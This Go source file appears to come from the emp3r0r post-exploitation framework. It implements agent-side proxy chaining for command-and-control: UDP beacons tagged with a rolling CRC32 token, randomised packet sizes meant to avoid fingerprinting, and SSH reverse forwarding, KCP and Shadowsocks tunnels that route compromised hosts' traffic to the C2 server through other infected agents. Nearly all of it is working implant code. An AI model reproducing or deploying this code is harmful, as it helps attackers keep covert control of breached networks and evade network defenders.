package modules

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"net"
	"net/url"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ReverseConns record ssh reverse proxy sessions
var (
	ReverseConns      = make(map[string]context.CancelFunc)
	ReverseConnsMutex = &sync.Mutex{}
)

// getRollingTag generates a time-based token (TOTP style)
// It creates a unique 4-byte signature for the given time slot.
func getRollingTag(timeSlot int64) []byte {
	// 1. Convert time slot to bytes
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, timeSlot)

	// 2. Hash the Shared Secret + Time Slot
	// We use the MagicString as the secret key
	key := []byte(def.MagicString)
	input := append(key, buf.Bytes()...)

	// 3. Calculate Checksum (CRC32 is fine here as it's now dynamic)
	checksum := crc32.ChecksumIEEE(input)

	// 4. Return as bytes
	out := new(bytes.Buffer)
	binary.Write(out, binary.LittleEndian, checksum)
	return out.Bytes()
}

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string) (err error) {
	var passProxyCnt int // one time only

	defer cancel()
	bindaddr := ":" + port
	if port == "" {
		bindaddr = ":" + common.RuntimeConfig.ProxyChainBroadcastPort
	}
	pc, err := net.ListenPacket("udp4", bindaddr)
	if err != nil {
		return
	}
	defer pc.Close()
	logging.Println("BroadcastServer started")

	buf := make([]byte, 1024)

	// reverseProxy listener
	// ssh reverse proxy
	go func() {
		err = transport.SSHRemoteFwdServer(common.RuntimeConfig.Bring2CCReverseProxyPort,
			common.RuntimeConfig.Password,
			common.RuntimeConfig.SSHHostKey)
		if err != nil {
			logging.Printf("SSHProxyServer: %v", err)
		}
	}()

	go c2transport.RunSSServer() // start shadowsocks server for proxy chaining

	// kcp server that forwards to ssh reverse proxy
	go func() {
		ctx, cancel := context.WithCancel(context.Background())
		err = transport.KCPTunServer(
			fmt.Sprintf("127.0.0.1:%s", common.RuntimeConfig.Bring2CCReverseProxyPort), // forward to ssh reverse proxy
			common.RuntimeConfig.KCPServerPort,
			common.RuntimeConfig.Password,
			def.MagicString,
			ctx, cancel)
		if err != nil {
			logging.Printf("KCP tunnel for reverse proxy: %v", err)
		}
	}()

	// monitor until it works
	go func() {
		// does the proxy work?
		rproxy := fmt.Sprintf("socks5://%s:%s@127.0.0.1:%s",
			common.RuntimeConfig.ShadowsocksLocalSocksPort, // user name of socks5 proxy
			common.RuntimeConfig.Password,                  // password of socks5 proxy

			// To make this work, we forward the socks5 proxy from another agent to us
			common.RuntimeConfig.AgentSocksServerPort) // port of socks5 proxy

		// wait for the proxy to work
		for {
			if common.RuntimeConfig.C2TransportProxy != "" {
				if transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
					logging.Printf("BroadcastServer reverse proxy checker: proxy '%s' is already working", common.RuntimeConfig.C2TransportProxy)
					util.TakeASnap()
					continue
				}
			}

			// Optimization: Don't check connectivity if the local port isn't even open
			// This avoids spamming logs when no reverse proxy is connected
			if netutil.IsPortOpen("127.0.0.1", common.RuntimeConfig.AgentSocksServerPort) {
				if transport.IsProxyOK(rproxy, def.CCAddress) {
					break
				}
			}
			util.TakeASnap()
		}
		common.RuntimeConfig.C2TransportProxy = rproxy
		logging.Printf("[+] Reverse proxy configured to %s", rproxy)

		// pass the proxy to others
		if common.RuntimeConfig.C2TransportProxy == rproxy {
			go passProxy(ctx, cancel, &passProxyCnt)
		}
	}()

	// keep listening for broadcasts
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil || n == 0 {
			logging.Printf("BroadcastServer has read nothing: %v", err)
			continue
		}
		logging.Printf("BroadcastServer: received %d bytes from %s", n, addr)

		// Filter 1: Check length (ignore tiny runt packets < 32 bytes)
		if n < 32 {
			logging.Printf("BroadcastServer: dropped tiny packet (%d bytes) from %s", n, addr)
			continue
		}

		// Calculate Time Slots (30 second intervals)
		now := time.Now().Unix()
		currentSlot := now / 30
		prevSlot := currentSlot - 1 // Allow 30s drift
		nextSlot := currentSlot + 1 // Allow 30s ahead

		// Generate valid tags for Now and (Now - 30s)
		validTagCurrent := getRollingTag(currentSlot)
		validTagPrev := getRollingTag(prevSlot)
		validTagNext := getRollingTag(nextSlot)

		// Validate: Does the packet header match either valid tag?
		tag := buf[:4]
		if !bytes.Equal(tag, validTagCurrent) && !bytes.Equal(tag, validTagPrev) && !bytes.Equal(tag, validTagNext) {
			logging.Printf("BroadcastServer: dropped packet from %s. Tag: %x. Expected: %x / %x / %x. Time: %d (Slot %d)",
				addr, tag, validTagCurrent, validTagPrev, validTagNext, now, currentSlot)
			continue // Invalid or expired tag
		}

		// Extract Source IP
		udpAddr, ok := addr.(*net.UDPAddr)
		if !ok {
			continue
		}
		srcIP := udpAddr.IP.String()

		// Filter 2: Ignore localhost
		if srcIP == "127.0.0.1" || srcIP == "::1" {
			continue
		}

		logging.Printf("BroadcastServer: received beacon from %s", srcIP)

		if common.RuntimeConfig.C2TransportProxy != "" &&
			transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
			logging.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
			continue
		}

		// Reconstruct SOCKS5 URL
		// We use Shadowsocks to secure the connection
		proxy_url := fmt.Sprintf("socks5://127.0.0.1:%s", common.RuntimeConfig.ShadowsocksLocalSocksPort)

		// Check deduplication
		if common.RuntimeConfig.C2TransportProxy == proxy_url {
			if transport.IsProxyOK(proxy_url, def.CCAddress) {
				logging.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
				continue
			}
		}

		// Check if local Shadowsocks client is running
		if !netutil.IsPortOpen("127.0.0.1", common.RuntimeConfig.ShadowsocksLocalSocksPort) {
			logging.Printf("BroadcastServer: starting Shadowsocks client for %s", srcIP)
			go c2transport.StartLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
			// give it some time to start
			time.Sleep(1 * time.Second)
		}

		// test proxy
		is_proxy_ok := transport.IsProxyOK(proxy_url, def.CCAddress)

		// if the proxy is not working
		// restart Shadowsocks local socks5 proxy
		if !is_proxy_ok {
			logging.Printf("BroadcastServer: proxy %s failed, restarting Shadowsocks client pointing to %s", proxy_url, srcIP)
			c2transport.SS_Cancel()
			c2transport.SS_Ctx, c2transport.SS_Cancel = context.WithCancel(context.Background())
			go c2transport.StartLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
			// give it some time to start
			time.Sleep(1 * time.Second)
		}

		// test proxy again
		is_proxy_ok = transport.IsProxyOK(proxy_url, def.CCAddress)

		if is_proxy_ok {
			common.RuntimeConfig.C2TransportProxy = proxy_url
			logging.Printf("[+] Thank you! Proxy '%s' usable!", proxy_url)
			logging.Printf("BroadcastServer: %s set as common.RuntimeConfig.AgentProxy\n", common.RuntimeConfig.C2TransportProxy)

			// pass the proxy to others
			go passProxy(ctx, cancel, &passProxyCnt)

		} else {
			logging.Printf("[-] Oh crap! %s doen't work, we have to wait for a usable proxy", proxy_url)
		}
	}
	return
}

// passProxy let other agents on our network use our common.RuntimeConfig.AgentProxy
func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
	// one time only
	*count++
	if *count > 1 {
		logging.Printf("passProxy count %d, aborting", *count)
		return
	}

	proxyAddr := common.RuntimeConfig.C2TransportProxy
	parsed_url, err := url.Parse(proxyAddr)
	if err != nil {
		logging.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
		return
	}
	go func() {
		if parsed_url.Hostname() == "127.0.0.1" {
			logging.Printf("common.RuntimeConfig.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
			return
		}
		logging.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
		err := transport.TCPFwd(parsed_url.Host, common.RuntimeConfig.AgentSocksServerPort, ctx, cancel)
		if err != nil {
			logging.Print("TCPFwd: ", err)
		}
	}()
	go StartBroadcast(false, ctx, cancel)
}

func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
	// disable broadcasting when interval is 0
	if common.RuntimeConfig.ProxyChainBroadcastIntervalMax == 0 {
		logging.Println("Broadcasting is turned off, aborting")
		return
	}

	if start_socks5 {
		// start a socks5 proxy
		err := Socks5Proxy("on", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
		if err != nil {
			logging.Printf("Socks5Proxy on: %v", err)
			return
		}
		defer func() {
			err := Socks5Proxy("off", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
			if err != nil {
				logging.Printf("Socks5Proxy off: %v", err)
			}
		}()
	}

	defer func() {
		logging.Print("Broadcasting stopped")
		cancel()
	}()

	for ctx.Err() == nil {
		logging.Print("Broadcasting our proxy...")

		// [IMPORTANT] Generate the tag FRESH for this moment
		timeSlot := time.Now().Unix() / 30
		magicTag := getRollingTag(timeSlot)
		logging.Printf("StartBroadcast: sending tag %x for slot %d (Time: %d)", magicTag, timeSlot, time.Now().Unix())

		// Prepare payload: Tag (4 bytes) + Random (28+ bytes)
		// Randomize packet size to avoid fingerprinting (32 to 256 bytes)
		packetSize := util.RandInt(32, 256)
		payload := make([]byte, packetSize)

		// 1. Tag
		copy(payload[:4], magicTag)

		// 2. Random Noise
		rand.Read(payload[4:])

		ips := netutil.IPaddr()
		for _, netip := range ips {
			broadcastAddr := netutil.IPbroadcastAddr(netip)
			if broadcastAddr == "" {
				continue
			}

			// Send raw UDP packet
			dst := broadcastAddr + ":" + common.RuntimeConfig.ProxyChainBroadcastPort
			addr, err := net.ResolveUDPAddr("udp4", dst)
			if err != nil {
				logging.Printf("StartBroadcast resolve %s: %v", dst, err)
				continue
			}

			conn, err := net.ListenPacket("udp4", ":0")
			if err != nil {
				logging.Printf("StartBroadcast listen: %v", err)
				continue
			}

			_, err = conn.WriteTo(payload, addr)
			conn.Close()

			if err != nil {
				logging.Printf("StartBroadcast send to %s: %v", dst, err)
			} else {
				logging.Printf("StartBroadcast: sent beacon to %s", dst)
			}
		}
		time.Sleep(time.Duration(util.RandInt(common.RuntimeConfig.ProxyChainBroadcastIntervalMin, common.RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
	}
}
